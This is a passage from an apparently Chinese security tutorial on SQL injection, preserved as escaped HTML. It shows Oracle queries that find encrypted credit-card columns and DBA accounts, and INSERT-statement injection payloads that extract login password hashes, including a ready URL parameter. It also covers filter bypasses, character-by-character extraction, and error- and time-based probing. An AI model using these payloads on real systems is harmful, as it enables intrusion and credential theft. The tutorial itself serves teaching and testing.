S:&lt;span class=&#34;token number&#34;&gt;38968&lt;/span&gt;E8CEC12026112B0010BCBA3ECC2FD278AFA17AE363FDD74674F2651&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;高级用户，找到加密内容的表，都加密了一定会有可利用的&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;table&lt;/span&gt; name&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;column&lt;/span&gt; name&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;encryption_alg&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;salt &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; dba_encrypted_columns&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; 

&lt;span class=&#34;token keyword&#34;&gt;TABLE&lt;/span&gt; NAME       &lt;span class=&#34;token keyword&#34;&gt;COLUMN&lt;/span&gt; NAME    ENCRYPTION ALG       SALT CREDITCARD		CCNR          AES256              &lt;span class=&#34;token keyword&#34;&gt;NO&lt;/span&gt;
CREDITCARD		  CVE           AES256              &lt;span class=&#34;token keyword&#34;&gt;NO&lt;/span&gt;
CREDITCARD        VALID          AES256              &lt;span class=&#34;token keyword&#34;&gt;NO&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;检索数据库存在哪些DBA账户&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;Select&lt;/span&gt; grantee&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;granted_role&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;admin_option&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;default_role &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; dba_role_privs &lt;span class=&#34;token keyword&#34;&gt;where&lt;/span&gt; granted_role&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;DBA&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;在INSERT查询中实施注入攻击&#34;&gt;&lt;a href=&#34;#在INSERT查询中实施注入攻击&#34; class=&#34;headerlink&#34; title=&#34;在INSERT查询中实施注入攻击&#34;&gt;&lt;/a&gt;在INSERT查询中实施注入攻击&lt;/h3&gt;&lt;p&gt;更新数据后执行注入查询语句，update，delete一个意思&lt;/p&gt;
&lt;h4 id=&#34;第一种情形：插入用户规定的数据&#34;&gt;&lt;a href=&#34;#第一种情形：插入用户规定的数据&#34; class=&#34;headerlink&#34; title=&#34;第一种情形：插入用户规定的数据&#34;&gt;&lt;/a&gt;第一种情形：插入用户规定的数据&lt;/h4&gt;&lt;h5 id=&#34;插入的不是最后一列&#34;&gt;&lt;a href=&#34;#插入的不是最后一列&#34; class=&#34;headerlink&#34; title=&#34;插入的不是最后一列&#34;&gt;&lt;/a&gt;插入的不是最后一列&lt;/h5&gt;&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;-- 插入模板&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;INSERT&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;INTO&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;table&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;col1&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;col2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;VALUES&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;sql&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;notsql&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;插入第一列，构造SQL代码关闭&lt;code&gt;sql&lt;/code&gt;，再构建我们需要查询的第二列，注释掉其他部分&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;INSERT&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;INTO&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;table&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;col1&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;col2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;VALUES&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;sql&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;TOP&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; name &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39; | &#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; master&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;fn_varbintohexstr&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;password_hash&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; sys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sql_logins&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;-- &#39;,&#39;notsql&#39;)&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;-- fn_varbintohexstr将二进制的哈希值转换为十六进制格式&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;-- http://test/?sql=sql&#39;,(SELECT TOP 1 name + &#39; | &#39; + master.sys.fn_varbintohexstr(password_hash) from sys.sql_logins))-- &amp;amp;notsql=notsql&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;插入的是最后一列&#34;&gt;&lt;a href=&#34;#插入的是最后一列&#34; class=&#34;headerlink&#34; title=&#34;插入的是最后一列&#34;&gt;&lt;/a&gt;插入的是最后一列&lt;/h5&gt;&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;-- 插入模板&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;INSERT&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;INTO&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;table&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;col1&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; col2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;VALUES&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;notsql&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;sql&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;在mysql中只有处于ANSI模式(或者任何实现了 PIPES_AS_QUOTES的其他模式，比如DB2、ORACLE或MAXDB)，管道符才会被解析成连接符。然而，一般都是未实现PIPES_AS_QUOTES(比如处于TRADITIONAL模式)，那么||操作符将被解析为一个OR逻辑操作符，而不是一个连接操作符。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;INSERT&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;INTO&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;table&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;col1&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;col2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;VALUES&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;foo&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;bar&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; @&lt;span class=&#34;token variable&#34;&gt;@version&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;--&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;INSERT&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;INTO&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;table&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;col1&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;col2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;VALUES&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;foo&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; CONCAT&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;bar&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; @@ version&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;--&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;利用整数与字符相加，优先显示数字的特性&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;INSERT&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;INTO&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;table&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;col1&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;col2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;VALUES&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;foo&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;d&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;/**/&lt;/span&gt;substring&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;/**/&lt;/span&gt;@&lt;span class=&#34;token variable&#34;&gt;@version&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;显示@@version的第一个字符，/**/绕过空格&lt;/p&gt;
&lt;p&gt;转化非整数字符使用ASCII()&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;INSERT&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;INTO&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;table&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;col1&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;co12&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;VALUES&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;foo&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;bar&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;/**/&lt;/span&gt;ascii&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;substring&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;INSERT&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;INTO&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;table&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;col1&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;col2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;VALUES&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;foo&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;bar&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;/**/&lt;/span&gt;ascii&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;substring&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;INSERT&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;INTO&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;table&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;col1&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;col2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;VALUES&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;foo&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;bar&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;/**/&lt;/span&gt;ascii&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;substring&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;第二种情形：生成INSERT错误&#34;&gt;&lt;a href=&#34;#第二种情形：生成INSERT错误&#34; class=&#34;headerlink&#34; title=&#34;第二种情形：生成INSERT错误&#34;&gt;&lt;/a&gt;第二种情形：生成INSERT错误&lt;/h4&gt;&lt;p&gt;为了不污染原数据表，执行子查询，使insert失败，返回错误中得到信息&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;INSERT&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;INTO&lt;/span&gt; users &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;name&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; age&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;VALUES&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;foo&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

foo&#39;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;top&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; name &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; users &lt;span class=&#34;token keyword&#34;&gt;where&lt;/span&gt; age&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;@&lt;span class=&#34;token variable&#34;&gt;@version&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;-- &lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;先执行子查询，由于@@version不是数字，报错，不执行insert&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; columnl &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;table&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; column1 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;test&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;标量子查询就是只返回单列值而不是多列值或多行的子查询，如果子查询返回一个值或者NULL，外部将执行，返回超过一行就会终止外部查询展示错误信息，所以可以插入两个select&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;CASE&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;WHEN&lt;/span&gt; @&lt;span class=&#34;token variable&#34;&gt;@version&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;LIKE&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;5.1.56%&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;THEN&lt;/span&gt; SLEEP&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;ELSE&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;somevalue&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;END&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;valuel&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;AS&lt;/span&gt; foobar&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;UNION&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;value2&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;AS&lt;/span&gt; foobar&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; ALIAS&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;CASE子句检查提取的MySQL版本信息，如果遇到特定的版本，SLEEP命令将执行以延迟5秒的时间。这可以告诉我们MySQL是否是某个特定的版本，同时UNION命令将确保向外部SELECT返回两行数据，从而产生错误。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;-- 插入模板&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;INSERT&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;INTO&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;table&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;VALUES&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;injectable_parameter&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- 注入参数&lt;/span&gt;
